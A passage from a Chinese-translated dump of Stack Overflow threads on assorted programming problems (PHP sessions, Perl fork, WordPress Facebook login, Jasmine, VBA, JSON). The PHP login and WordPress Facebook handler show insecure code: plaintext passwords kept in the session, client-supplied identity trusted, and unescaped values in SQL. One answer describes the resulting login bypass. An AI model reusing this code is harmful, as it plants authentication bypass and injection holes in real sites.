$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
$mypassword = mysql_real_escape_string($mypassword);
$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);

// If result matched $myusername and $mypassword, table row must be 1 row
if($count==1){

// Register $myusername, $mypassword and redirect to file "login_success.php"
session_register("myusername");
session_register("mypassword"); 
header("location:login_success.php");
}
else {
echo "Wrong Username or Password";
}
?> 
```

**注销代码**

```
<?php 
session_start();
session_unset();
header("Location: main_login.php");
?> 
```

但是有些东西不起作用，该页面`login_success.php`应该只有在登录时才能访问，所以要么注销不起作用，要么`login_success.php`检查不起作用。但我不知道该怎么说，我试过和他们一起玩，还是没有进一步的前进。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T13:46:08.543

[快速检查 PHP 手册会发现答案](http://php.net/manual/en/function.session-is-registered.php)

> 如果使用 $_SESSION（或 PHP 4.0.6 或更低版本的 $HTTP_SESSION_VARS），请使用 isset() 检查在 $_SESSION 中注册的变量。

笔记：

您的源代码中还有其他错误：`myusername`应该引用，`header()` 应该跟在后面`exit;`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T13:45:26.190

我相信这在这里得到了回答：

[session_is_registered 的 PHP 替代方案](https://stackoverflow.com/questions/2600905/php-alternative-to-session-is-registered)

和

```
if( isset($_SESSION[$myusername]) ) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:49:58.153

始终与空支票一起使用

```
if( isset($_SESSION[$myusername])  and $_SESSION[$myusername]<>"") 
```

# c++ - 在 MFC 图片框中显示 IPLimage/ MAT (opencv)

> ID：13530344
> 
> 赞同：2
> 
> 时间：2012-11-23T13:43:01.913
> 
> 标签：c++, visual-c++, opencv, mfc

我想在 Visual C++ 中的 MFC 图片框上显示 IPLimage / MAT (opencv) 格式

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-28T15:07:23.823

这是一个完整的解决方案，描述了如何使用 OpenCV 在 MCF/C++ 表单应用程序中显示 IplImage [http://ac-it.pl/display-an-iplimage-in-a-mcfc-form-application-using-opencv](http://ac-it.pl/display-an-iplimage-in-a-mcfc-form-application-using-opencv)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:05:31.913

图片框只能显示我认为的位图。您需要将 IPLimage 转换为位图。

假设您可以先将 IPLimage 转换为 RGB 值的缓冲区，请参阅[从内存缓冲区创建 HBITMAP](https://stackoverflow.com/q/4598872/492336)

然后，当您获得 HBITMAP 时，您需要将其加载到图片框中。假设图片框是指静态控件，添加`SS_BITMAP`到其样式，然后使用加载 HBITMAP

```
SendMessage(hStatic, STM_SETIMAGE, (WPARAM)IMAGE_BITMAP, (LPARAM)hBitmap); 
```

# perl - perl 后台进程

> ID：13530345
> 
> 赞同：4
> 
> 时间：2012-11-23T13:43:08.643
> 
> 标签：perl, background, fork, sleep, wait

我正在尝试在 perl 中运行后台进程。我创建了一个子进程，用于调用另一个 perl 脚本。我想与这个子进程并行运行几行代码。子进程完成后。我想打印一行代码。

### 主脚本

```
#!/usr/bin/perl

$|=1;

print "before the child process\n";

my $pid = fork();

if (defined $pid)
{
    system("perl testing.pl");
}

print "before wait command\n";

wait();

print "after 20 secs of waiting\n"; 
```

### 测试.pl

```
#!/usr/bin/perl

print "inside testing\n";

sleep(20); 
```

### 预期产出

```
在子进程之前
在等待命令之前
*（应等待 20 秒再打印）*
等待 20 秒后
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T14:05:43.583

你的脚本有很多问题。总是：

```
use strict;
use warnings; 
```

`local`使用特殊变量是一个好习惯。只有包含特殊值的变量`undef`才会为`defined`. 因此，所有其他值（甚至是`0`; 就是这种情况）对于`defined`. 在另一个脚本中，[shebang](http://en.wikipedia.org/wiki/Shebang_%28Unix%29)是错误的。

```
#!/usr/bin/perl

use strict;
use warnings;

local $| = 1;

print "Before the child process\n";

unless (fork) {
    system("perl testing.pl");
    exit;
}

print "Before wait command\n";
wait;
print "After 20 secs of waiting\n"; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-23T13:53:47.143

[perlipc 文档](http://perldoc.perl.org/perlipc.html)的[“后台进程”部分](http://perldoc.perl.org/perlipc.html#Background-Processes)内容为

> 您可以在后台运行命令：
> 
> ```
> system("cmd &"); 
> ```
> 
> 命令的`STDOUT`and `STDERR`（可能`STDIN`，取决于您的 shell）将与父级的相同。`SIGCHLD`由于双重`fork`发生，您无需捕捉；详情见下文。

在你的程序中为参数添加一个和号`system`可以极大地简化你的主程序。

```
#! /usr/bin/env perl

print "before the child process\n";

system("perl testing.pl &") == 0
  or die "$0: perl exited " . ($? >> 8);

print "before wait command\n";

wait;
die "$0: wait: $!" if $? == -1;

print "after 20 secs of waiting\n"; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T03:45:10.013

`fork`返回值处理确实有点棘手。 [亚里士多德最近的文章](http://blogs.perl.org/users/aristotle/2012/10/concise-fork-idiom.html)有一个简洁明了的分叉习语，在你的例子中，它看起来像：

```
#!/usr/bin/env perl
use 5.010000;
use strict;
use warnings qw(all);

say 'before the child process';
given (fork) {
    when (undef) { die "couldn't fork: $!" }
    when (0) {
        exec $^X => 'testing.pl';
    } default {
        my $pid = $_;
        say 'before wait command';
        waitpid $pid, 0;
        say 'after 20 secs of waiting';
    }
} 
```

注意`exec $^X => '...'`行：**$^X**变量保存了当前 Perl 可执行文件的完整路径，因此“正确的 Perl 版本”将得到保证。此外，`system`预分叉时调用毫无意义。

# ios - 触摸时禁用其他栏按钮项：导航栏

> ID：13530347
> 
> 赞同：0
> 
> 时间：2012-11-23T13:43:16.747
> 
> 标签：ios, uinavigationcontroller, uinavigationbar, uinavigationitem

我有一个导航控制器，在它的导航栏中我有 2 个右栏按钮项目，我想在单击/点击另一个右栏按钮时禁用一个右栏按钮。如何做到这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:49:48.747

不幸的是`UIBarButtonItems`只有一个回调，这相当于`UIButton`'s `UIControlEventTouchUpInside`。

如果您想在用户按下并释放按钮时执行某些操作（禁用/重新启用其他按钮），您可能不得不使用一些自定义来弄脏您的手，这些自定义`UIBarButtonItems`具有`UIButton's`as`customView`并进行一些仔细的事件处理以了解何时启用/禁用每个。

就个人而言：同时按下多个条形按钮不是很常见，并且不应该出现问题，无论您可能有什么实现。

# json - 如何使用“wp_insert_user”进行 Facebook 登录？

> ID：13530348
> 
> 赞同：2
> 
> 时间：2012-11-23T13:43:21.337
> 
> 标签：json, wordpress, facebook-javascript-sdk, wordpress-theming

我正在构建一个用户生成的内容共享主题，并且我想创建一个自定义的 Facebook 连接。经过研究，我发现了这段代码。

以下代码将应用程序添加到 Facebook 的用户个人资料中，但不会创建新用户，也不会让他们登录。

这是完整的代码（将在 中添加`functions.php`）。

## 第 1 步 - 在标题区域初始化 javascript

```
function fb_head(){
    if( is_user_logged_in() ) 
        return;
    ?>
    <script type="text/javascript">
        window.fbAsyncInit = function(){
            FB.init({
                appId:'APP_ID', 
                status:true, 
                cookie:true, 
                xfbml:true, 
                oauth:true
            });
        };
    </script>
    <div id="fb-root"></div>
    <script type="text/javascript">
        (function() {
            var e = document.createElement('script');
            e.type = 'text/javascript';
            e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
            e.async = true;
            document.getElementById('fb-root').appendChild(e);
        }());
    </script>
    <?php
}
add_action( 'wp_head', 'fb_head' ); 
```

## 第 2 步 - 插入一个用于 facebook 登录的按钮

```
<button id="facebook_connect">Connect with facebook</button> 
```

## 第 3 步 - 加载 Jquery 库

```
function mytheme_enqueue_scripts(){
    wp_enqueue_script( 'jquery' );
}
add_action( 'wp_enqueue_scripts', 'mytheme_enqueue_scripts'); 
```

## 第 4 步 - 为我们创建的按钮添加一个 jQuery on-click 功能

此代码将放置在 wp 页脚部分（在结束 body 标记之前）。

```
function fb_footer(){
    if( is_user_logged_in()):
        echo "<script type='text/javascript'> jQuery('#facebook_connect').hide(); </script>";
        return;
    endif;
    ?>
    <script type="text/javascript">
        jQuery('#facebook_connect').click(function(){
            FB.login(function(FB_response){
                if( FB_response.status === 'connected' ){
                    fb_intialize(FB_response);
                }
            },
            {scope: 'email'});
        });

        function fb_intialize(FB_response){
            FB.api( 
                '/me', 
                'GET', 
                {'fields':'id,email,username,verified,name'},
                function(FB_userdata){
                    jQuery.ajax({
                        type: 'POST',
                        url: 'AJAXURL',
                        data: {
                            "action": "fb_intialize", 
                            "FB_userdata": FB_userdata, 
                            "FB_response": FB_response
                        },
                        success: function(user){
                            if( user.error ){
                                alert( user.error );
                            }
                            else if( user.loggedin ){
                                window.location.reload();
                            }
                        }
                    });
                }
            );
        };
    </script>
    <?php
}
add_action( 'wp_footer', 'fb_footer' ); 
```

## 第 5 步 - 主要步骤：添加处理函数

```
function wp_ajax_fb_intialize(){
    @error_reporting( 0 ); // Don't break the JSON result
    header( 'Content-type: application/json' );

    if( !isset( $_REQUEST['FB_response'] ) || !isset( $_REQUEST['FB_userdata'] ))
        die( json_encode( array( 'error' => 'Authonication required.' )));

    $FB_response = $_REQUEST['FB_response'];
    $FB_userdata = $_REQUEST['FB_userdata'];
    $FB_userid = (int) $FB_userdata['id'];

    if( !$FB_userid )
        die( json_encode( array( 'error' => 'Please connect your facebook account.' )));

    global $wpdb;
    $user_ID = $wpdb->get_var( "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '_fbid' AND meta_value =  '$FB_userid'" );

    if( !$user_ID ){
        $user_email = $FB_userdata['email'];
        $user_ID = $wpdb->get_var( "SELECT ID FROM $wpdb->users WHERE user_email = '$user_email'" );

        if( !$user_ID ){
            if ( !get_option( 'users_can_register' ))
                die( json_encode( array( 'error' => 'Registration is not open at this time. Please come back later..' )));

            extract( $FB_userdata );

            $display_name = $name;
            $user_login = $username;

            if( empty( $verified ) || !$verified )
                die( json_encode( array( 'error' => 'Your facebook account is not verified. You hae to verify your account   before proceed login or registering on this site.' )));

            $user_email = $email;
            if ( empty( $user_email ))
                die( json_encode( array( 'error' => 'Please re-connect your facebook account as we couldnt find your email  address..' )));

            if( empty( $name ))
                die( json_encode( array( 'error' => 'empty_name', 'We didnt find your name. Please complete your facebook   account before proceeding..' )));

            if( empty( $user_login ))
                $user_login = sanitize_title_with_dashes( sanitize_user( $display_name, true ));

            if ( username_exists( $user_login ))
                $user_login = $user_login. time();

            $user_pass = wp_generate_password( 12, false );
            $userdata = compact( 'user_login', 'user_email', 'user_pass', 'display_name' );

            $user_ID = wp_insert_user( $userdata );
            if ( is_wp_error( $user_ID ))
                die( json_encode( array( 'error' => $user_ID->get_error_message())));

            update_user_meta( $user_ID, '_fbid', (int) $id );
        }
        else{
            update_user_meta( $user_ID, '_fbid', (int) $FB_userdata['id'] );
        }
    }

    wp_set_auth_cookie( $user_ID, false, false );
    die( json_encode( array( 'loggedin' => true )));
}
add_action( 'wp_ajax_nopriv_fb_intialize', 'wp_ajax_fb_intialize' ); 
```

这就是我添加 Facebook 按钮的方式：

```
 <button id="facebook_connect">Connect with Facebook</button> 
```

如果有人正在尝试，请更换 App ID。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-20T14:44:01.453

感谢您的代码！像魅力一样工作。但是我发现了一件非常重要的安全事情！

在控制台中，我只是在发送 ajax 请求之前更改了 facebook 变量，我可以使用每个人的 fb 帐户登录（如果你知道他们的 facebook id）。接下来的几行还检查 fb 令牌并验证登录是否真的有效！

因此，在您的**wp_ajax_fb_initialize**函数中，您应该明确添加以下几行：

```
$FB_response = $_REQUEST['FB_response'];
$FB_userdata = $_REQUEST['FB_userdata'];
$FB_userid = (int) $FB_userdata['id'];

//NEW CODE INSERT - check if token is valid
$token = $FB_response['authResponse']['accessToken'];
$path = 'https://graph.facebook.com/me?access_token='.$token;
$content = @file_get_contents($path);
$fb_user = json_decode($content);
if ($fb_user->id != $FB_userdata['id'])
    die( json_encode( array( 'error' => 'FB login error' ))); 
```

我使用了 file_get_contents 但也可以使用 curl

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-06T10:44:45.373

将ajax url从

```
url: 'AJAXURL', 
```

至

```
url: '<?php echo admin_url('admin-ajax.php'); ?>', 
```

我在测试时注意到的一件事是，如果我从 wp_users 表中删除用户，则具有 facebook id 的用户元数据仍然存在，因此您可能需要检查 facebook id 是否与您的 ajax 回调中的无效用户 id 相关联，例如

```
global $wpdb;
$user_ID = $wpdb->get_var( "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '_fbid' AND meta_value =  '$FB_userid'" );

// check if the user id is valid
if( false === ($check_user = get_userdata($user_ID)) )
{
  $user_ID = false; // set to false to force create a new user
} 
```

您的其余代码工作正常。

# yii - 搜索表单的分页不起作用

> ID：13530359
> 
> 赞同：1
> 
> 时间：2012-11-23T13:44:24.533
> 
> 标签：yii, pagination

我在我的搜索结果上实现分页，在第一页上它工作正常，但问题是当我点击 2 获得第二页结果时，它显示空白页。

鉴于我有：

```
$this->widget('zii.widgets.CListView', array('dataProvider'=>$dataProvider,
                                             'itemView'=>'_listing')); 
```

在我的控制器中，我有：

```
if (isset($_POST)
{    
    (......)
    $dataProvider=new CArrayDataProvider($results,array(
                                                      'keyField' => 'brand_id',
                                                      'pagination'=>array(
                                                      'pageSize'=>5,
                                                  )));

    //echo "<pre>";  print_r($dataProvider);exit;

    $this->render('listing',array('dataProvider'=>$dataProvider, 'post' => $_POST));
} 
```

包含我的`$results`搜索结果，控制器检查是否设置了帖子，因此当第二页的加载请求发送到列表操作时，未设置帖子数据，因此它不输入代码并且不显示任何内容。

完成第二页的调用后，如何使发布数据可用于操作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T19:59:02.027

尝试这个

```
$this->widget('zii.widgets.CListView', array(
      'dataProvider'=>$dataProvider,
      'itemView'=>'_listing',
      'ajaxUpdate'=>'#divViewPanel',
      'enablePagination'=>true
)); 
```

# ruby-on-rails - 实现控制器和视图的疑惑

> ID：13530364
> 
> 赞同：0
> 
> 时间：2012-11-23T13:44:48.243
> 
> 标签：ruby-on-rails, ruby

我从 Ruby on Rails 开始，并正在制作一个应用程序，该应用程序将 facebook 用户的喜好转换为产品，创建个性化的礼物清单。

好吧，我有三个模型：用户和喜欢的产品。它们是这样的：

```
class Like < ActiveRecord::Base
  belongs_to :user
  has_one :product
  attr_accessible :category, :created_time, :name
end

class Product < ActiveRecord::Base
  belongs_to :user
  has_one :like
  attr_accessible :image_url, :price_max, :price_min, :product_name,
  :url
end

class User < ActiveRecord::Base
 has_many :likes, dependent: :destroy
 has_many :products, through: :likes, dependent: :destroy
 attr_accessible :email, :password, :password_confirmation, :remember_me,:first_name, :last_name, :gender, :facebook_username, :provider, :uid
end 
```

我还使用了两个宝石来帮助我抓住喜欢并将它们变成产品。为此，我在“rails 控制台”中使用了两种方法：

```
#Facebook Client
client = FBGraph::Client.new(
  client_id: 'client_id',
  secret_id: 'secret_id',
  token: 'token'
  )

#Getting and Recording Likes
like = client.selection.me.likes.info!.data.data
like.sort_by{ |like| like.created_time.to_i }.reverse.each do |like|
    case like.category
      when 'Musician/band' then category = 'band'
     ...
    else next
      Like.create(category: category, created_time: like.created_time, name: like.name, user_id: current_user.id)
    end

#Product API Client
buscape = Buscape.new(
  app_id: 'app_id',
  sandbox: true
  )

#Getting product through likes, and recording
def find_for_products
likes.each do |like|
  case like.category
    when 'band' then
      product = @buscape.products.where(keyword: URI.encode(like.name), categoryId: 2921, results: 1)['product']
    ...
    else next
    end

    Product.create(
      image_url:product['thumbnail']['url'],
      price_max:product['priceMax'],
      price_min:product['priceMin'],
      product_name:product['productName'],
      url:product['links']['link'][0]['url']
      )
  end
end 
```

使用 rails 控制台，我可以使用 Like.new 和 Product.new 手动注册产品和喜欢，并将其分配给访问和使用“user.products”的用户，但我不知道如何**实现它，在我看来**和**在我的控制器**中**捕捉 current_user 之类的内容并**在用户单击**“为我查找产品”按钮时生产产品**

谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:54:43.500

如果您正在使用资源，您可以`User`在`routes.rb`文件中定义一个新操作，如下所示：

```
resources :user do
  member do
    post 'find_products'
  end
end 
```

然后在控制器类中实现这个动作。

一种选择是将用于查询 FB 和查找产品的代码放入模型中的`self`方法中`Product`，例如`Product.find_and_create_products(user)`. 或者，`lib`在您的 rails 应用程序目录中的新文件中放入单独的模块。然后从控制器调用它。

如果此操作需要很长时间，您可以稍后添加一些附加代码以将其作为延迟作业运行，例如延迟[作业](https://github.com/collectiveidea/delayed_job)。

# javascript - Jasmine 期望逻辑（期望 A OR B）

> ID：13530365
> 
> 赞同：45
> 
> 时间：2012-11-23T13:44:50.407
> 
> 标签：javascript, unit-testing, logic, jasmine

如果满足以下两个期望之一，我需要将测试设置为成功：

```
expect(mySpy.mostRecentCall.args[0]).toEqual(jasmine.any(Number));
expect(mySpy.mostRecentCall.args[0]).toEqual(false); 
```

我希望它看起来像这样：

```
expect(mySpy.mostRecentCall.args[0]).toEqual(jasmine.any(Number)).or.toEqual(false); 
```

我在文档中遗漏了什么还是我必须编写自己的匹配器？

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2017-02-18T16:42:35.210

将多个可比较的字符串添加到一个数组中，然后进行比较。颠倒比较顺序。

```
expect(["New", "In Progress"]).toContain(Status); 
```

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2016-05-13T00:48:49.807

这是一个老问题，但如果有人还在寻找我还有另一个答案。

如何构建逻辑 OR 表达式并期待它？像这样：

```
var argIsANumber = !isNaN(mySpy.mostRecentCall.args[0]);
var argIsBooleanFalse = (mySpy.mostRecentCall.args[0] === false);

expect( argIsANumber || argIsBooleanFalse ).toBe(true); 
```

这样，您可以显式测试/预期 OR 条件，您只需要使用 Jasmine 来测试布尔匹配/不匹配。将在 Jasmine 1 或 Jasmine 2 中工作 :)

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2012-11-23T14:09:19.000

注意：此解决方案包含 Jasmine v2.0 之前版本的语法。有关自定义匹配器的更多信息，请参阅：[https ://jasmine.github.io/2.0/custom_matcher.html](https://jasmine.github.io/2.0/custom_matcher.html)

* * *

Matchers.js 仅适用于单个“结果修饰符” - `not`：

**核心/Spec.js：**

```
jasmine.Spec.prototype.expect = function(actual) {
  var positive = new (this.getMatchersClass_())(this.env, actual, this);
  positive.not = new (this.getMatchersClass_())(this.env, actual, this, true);
  return positive; 
```

**核心/Matchers.js：**

```
jasmine.Matchers = function(env, actual, spec, opt_isNot) {
  ...
  this.isNot = opt_isNot || false;
}
...
jasmine.Matchers.matcherFn_ = function(matcherName, matcherFunction) {
  return function() {
    ...
    if (this.isNot) {
      result = !result;
    }
  }
} 
```

所以看起来你确实需要编写自己的匹配器（从 a`before`或`it`bloc 中表示正确`this`）。例如：

```
this.addMatchers({
   toBeAnyOf: function(expecteds) {
      var result = false;
      for (var i = 0, l = expecteds.length; i < l; i++) {
        if (this.actual === expecteds[i]) {
          result = true;
          break;
        }
      }
      return result;
   }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-04-08T01:32:06.403

您可以将比较从 expect 语句中取出，以充分利用比较运算符。

```
let expectResult = (typeof(await varA) == "number" || typeof(await varA) == "object" );
expect (expectResult).toBe(true);
```

# c# - 关于 800700c1 的错误

> ID：13530367
> 
> 赞同：0
> 
> 时间：2012-11-23T13:44:52.133
> 
> 标签：c#, visual-studio-2010

当我从 sterling 网站运行 C# 示例时，出现错误“检索具有 CLSID {B9A792C1-9922-4DF7-B4AC-994EC261D92C} 组件的 COM 类工厂因以下错误而失败：800700c1。”错误代码是`private SterlingLib.STIOrderMaint stiMaint = new SterlingLib.STIOrderMaint();`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:06:25.680

I used Sterling ActiveX API in my code before. Maybe you should log in to Sterling before executing your program. Without login, instances of some interfaces can't be created.

# c# - 如何在 C# 中显示多个 .tif？

> ID：13530368
> 
> 赞同：1
> 
> 时间：2012-11-23T13:44:52.633
> 
> 标签：c#, image-processing, tiff

有什么简单的方法可以打开和显示多页 .tif 文件吗？我想编写一个简单的 winForm 应用程序来打开多个页面 .tif 文件并滚动这些页面？我想在我的项目中添加下一个和上一个按钮以滚动它们。有什么建议或例子吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T19:16:46.833

试用 Atalasoft 提供的免费[DotImage Photo SDK](http://www.atalasoft.com/free-dotnet-image-sdk)。虽然它不是开源的，但它是免费的，是查看图像的一个很好的选择。

同时我会看看[AForge.Net](http://www.aforgenet.com/)和[EmguCV 是否](http://www.emgu.com/wiki/index.php/Main_Page)可以打开 Multipage TIFF 图像并让你知道。这些框架是开源的，包括非常强大的图像处理 SDK。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-05T07:58:17.793

I know an SDK named leadtools that has the ability to load and display multipage TIF files using .NET. For a sample code, see the following link: [http://www.leadtools.com/help/leadtools/v175/dh/to/leadtools.topics~leadtools.topics.loadingsavingtutorials.html](http://www.leadtools.com/help/leadtools/v175/dh/to/leadtools.topics~leadtools.topics.loadingsavingtutorials.html)

# vba - 从 Excel VBA 宏执行 .bat 文件

> ID：13530371
> 
> 赞同：7
> 
> 时间：2012-11-23T13:45:22.460
> 
> 标签：vba, excel, batch-file

我的 excel vba 宏有问题。我需要它来执行与 Excel 工作簿位于同一文件夹中的批处理文件。代码有时运行良好。我不知道是什么导致了错误。这是代码：

```
Sub writebatch()
  Sheets("code").Select
  Application.DisplayAlerts = False
  ActiveWorkbook.SaveAs FileName:=ThisWorkbook.path & "\code.bat",
  FileFormat:=xlTextPrinter, CreateBackup:=False
  Application.DisplayAlerts = True
  ThisWorkbook.Saved = True
  Shell "cmd.exe /k cd " & ThisWorkbook.path & "&&code.bat"
  Application.Quit
End Sub 
```

它写入批处理文件，但随后不执行它。只有当我让命令窗口无法关闭并且它说找不到 code.bat 文件时。所以 changedir 命令起作用了。是否可以运行 cmd.exe 并使用相对路径运行 code.bat 而无需更改目录？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T15:17:32.650

首先，当您启动 CMD 实例时，如果您使用任何类型的运算符 (&)，则需要将整个 CMD 参数括起来：

```
CMD /K "command1 & command2" 
```

然后附上子内部参数，如下所示：

```
CMD /K "command "path with spaces" & command" 
```

所以你需要做这样的事情：

```
Shell "cmd.exe /k ""cd " & """ & ThisWorkbook.path & """ & " && code.bat""" 
```

请注意，我使用 """ 来转义引号，但我不知道如何在 VBA 中转义引号。

PS：如果有空格，请记住还要附上**code.bat ，但前提是有空格。**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T14:45:57.593

我很确定问题出在这条线上

```
Shell "cmd.exe /k cd " & ThisWorkbook.path & "&&code.bat" 
```

您需要在 前面有一个空格`&&`将其与`cd`命令分开，在它之后将其与`code.bat`.

```
Shell "cmd.exe /k cd " & ThisWorkbook.path & " && code.bat" 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-02-25T09:39:15.347

Shell "cmd.exe /k cd /d" & ThisWorkbook.path & "&& code.bat"

在这里，没有 /d cmd 将在文件夹中打开。通过 /d 它将在 d 驱动器中打开，您可以根据自己的方式更改它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-11-30T16:26:36.910

将引号（“）插入字符串的一种方法是使用字符代码转换函数 Chr（34），34 是引号（”）的 ASCII 值

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-10-25T08:28:37.943

我希望它对你有用。

```
Dim sfilename, fileName As String
Sub Run_file_bat()
    fileName = "" & ThisWorkbook.Path & "\code.bat" & ""

    VBA.Shell "Explorer.exe " & fileName, vbNormalFocus

End Sub 
```

# linux - 使用 sed/grep 更新匹配行

> ID：13530378
> 
> 赞同：0
> 
> 时间：2012-11-23T13:45:52.680
> 
> 标签：linux, sed, grep

我需要用另一个字符串替换模式匹配行。

例子

```
line1
line2
the serial port is ttyS0
line4 
```

我需要替换包含`ttyS0`as

```
line1
line2
You have to use usb interface
line4 
```

我怎样才能在 sed（或 grep）中做到这一点

我试过了`sed 's/ttyS0/You have to use usb interface/' myfile`。但它只替换该行中匹配的单词。我想更换整条线。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:00:51.527

像这样：

```
sed 's/.*ttyS0.*/You have to use usb interface/' myfile 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-23T14:12:33.073

使用[更改](http://www.grymoire.com/Unix/Sed.html#uh-42)选项的一种方法：

```
sed '/ttyS0/c\You have to use usb interface' myfile 
```

# jquery - 无效的 JSON 格式

> ID：13530381
> 
> 赞同：2
> 
> 时间：2012-11-23T13:46:01.187
> 
> 标签：jquery, asp.net, ajax

我正在构建 JSON 对象并使用 JQuery ajax 将其传递给服务器。

```
data: "{'authorID' : '" + authorID +
      "', 'title' : '" + encodeURIComponent(blogTitle) +
      "', 'msg' : '" + encodeURIComponent(blogBody) +
      "', 'preview' : '" + encodeURIComponent(mediaContent) +
      "', 'layoutID' : '" + previewLayoutId +
      "', 'threadID' : '" + threadID + "'}" 
```

但是当我的 blogBody 变量包含`'`代码失败并显示错误消息时：

```
{"Message":"Invalid object passed in, \u0027:\u0027 or \u0027}\u0027 expected. (107): {\u0027authorID\u0027 : \u0027148385\u0027, \u0027title\u0027 : \u0027123213\u0027, \u0027msg\u0027 : \u0027%3Cp%3Eqqq%3C%2Fp%3E%3Cp%3E%3Cbr%3E%3C%2Fp%3E%3Cp%3E\u0027\u0027\u0027\u0027%3C%2Fp%3E\u0027, \u0027preview\u0027 : \u0027\u0027, \u0027layoutID\u0027 : \u00271\u0027, \u0027threadID\u0027 : \u00270\u0027}","StackTrace":"   at System.Web.Script.Serialization.JavaScriptObjectDeserializer.DeserializeDictionary(Int32 depth)\r\n   at System.Web.Script.Serialization.JavaScriptObjectDeserializer.DeserializeInternal(Int32 depth)\r\n   at System.Web.Script.Serialization.JavaScriptObjectDeserializer.BasicDeserialize(String input, Int32 depthLimit, JavaScriptSerializer serializer)\r\n   at System.Web.Script.Serialization.JavaScriptSerializer.Deserialize(JavaScriptSerializer serializer, String input, Type type, Int32 depthLimit)\r\n   at System.Web.Script.Serialization.JavaScriptSerializer.Deserialize[T](String input)\r\n   at System.Web.Script.Services.RestHandler.GetRawParamsFromPostRequest(HttpContext context, JavaScriptSerializer serializer)\r\n   at System.Web.Script.Services.RestHandler.GetRawParams(WebServiceMethodData methodData, HttpContext context)\r\n   at System.Web.Script.Services.RestHandler.ExecuteWebServiceCall(HttpContext context, WebServiceMethodData methodData)","ExceptionType":"System.ArgumentException"} 
```

有人可以说错误在哪里以及如何解决吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-23T13:47:09.260

在[JSON](http://json.org/)中，键必须用双引号 ( `"`) 引用，而不是单引号 ( `'`)。同样，字符串值必须是双引号，而不是单引号。您正在使用单引号。例如，围绕`authorId`标题的文本。

因此，您至少需要交换这些引号，例如：

```
data: '{"authorID" : "' + authorID +
      '", "title" : "' + encodeURIComponent(blogTitle) +
      '", "msg" : "' + encodeURIComponent(blogBody) +
      '", "preview" : "' + encodeURIComponent(mediaContent) +
      '", "layoutID" : "' + previewLayoutId +
      '", "threadID" : "' + threadID + '"}' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T13:52:41.983

改用这个：

```
JSON.stringify(object) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-07T12:50:49.927

`JavaScriptSerializer()`在使用 Microsoft将对象转换为 JSON的功能时，我遇到了同样的问题。

它将撇号转换为`\u0027`，但**jqGrid**会很高兴地继续将它们显示为`\u0027`：

![在此处输入图像描述](../Images/5f4d797acc28a719713147e8849c7ed9.png)

我的解决方案就是停止使用微软的`JavaScriptSerializer()`功能..

```
string JSON = new JavaScriptSerializer().Serialize(myListOfObjects).ToString(); 
```

..并切换到 JSON.Net ..

```
string JSON = JsonConvert.SerializeObject(myListOfObjects); 
```

JSON.Net 还避免了将 DateTimes 转换为 JSON 的问题。微软的版本使用它自己讨厌的日期格式，例如：

```
/Date(1355496152000)/ 
```

呃，是的。是时候再次谷歌搜索了。或者使用 JSON.Net ！

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-10-10T17:18:43.227

JSON 字段名称应该用双引号括起来，字符串值也应该用双引号括起来。[请参阅此处](http://www.w3schools.com/js/js_json_syntax.asp)的JSON 语法规则。您还可以使用在线 JSON 验证网站（如[DebugJSON](http://debugjson.com) ）来验证 JSON 输出。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-11-23T13:51:07.237

正如 TJ Crowder 所说，你的元素应该有双引号，为了确保你的格式正确，你总是可以在这里验证你的 json 数组（我总是这样做）：

此外，您最好使用[它](http://james.newtonking.com/pages/json-net.aspx)来生成 json 数组

[http://jsonlint.com/](http://jsonlint.com/)

# c++ - 访问 Inventory.h 中的迭代器、向量

> ID：13530382
> 
> 赞同：2
> 
> 时间：2012-11-23T13:46:04.130
> 
> 标签：c++, vector, header

嘿，我使用了一个向量加上它的迭代器。我将它与 Inventory.cpp 一起放在 Inventory.h 文件中。我想知道我可以直接调用它，这样我就可以访问向量库函数，如推送、弹出等......因为目前我不能。有人可以帮我弄这个吗。

这是我的代码：

**库存.h**

```
//-------------------------------------------------------------------------------
//  Inventory.h
//-------------------------------------------------------------------------------

#ifndef INVENTORY_H
#define INVENTORY_H
#include <string>
#include <vector>

using namespace std; 
class Inventory
{
public:
    //Constructor
    Inventory();

    //Methods.
    string add(string item);
